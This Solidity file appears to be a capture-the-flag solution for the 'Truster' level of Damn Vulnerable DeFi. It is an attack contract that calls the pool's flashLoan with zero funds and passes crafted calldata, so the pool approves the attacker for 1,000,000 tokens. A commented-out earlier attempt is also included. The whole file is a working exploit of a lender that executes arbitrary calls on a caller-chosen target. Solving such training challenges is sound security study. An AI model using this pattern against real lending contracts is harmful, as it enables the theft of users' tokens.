// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {TrusterLenderPool} from "./TrusterLenderPool.sol";

contract TrusterAttack {
    IERC20 public immutable damnValuableToken;
    TrusterLenderPool public trusterLenderPool;
    address public owner;

    constructor(address _tokenAddress, address _TrusterLenderPool) {
        damnValuableToken = IERC20(_tokenAddress);
        trusterLenderPool = TrusterLenderPool(_TrusterLenderPool);
        owner = msg.sender;
    }

    // function exploit() public {

    //     damnValuableToken.approve(owner, 1_000_000e18);
    //     damnValuableToken.transfer(address(this), 0);
    // }

    function flashloan() public {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            owner,
            1_000_000e18
        );

        trusterLenderPool.flashLoan(
            0,
            address(this),
            address(damnValuableToken),
            data
        );
    }
}
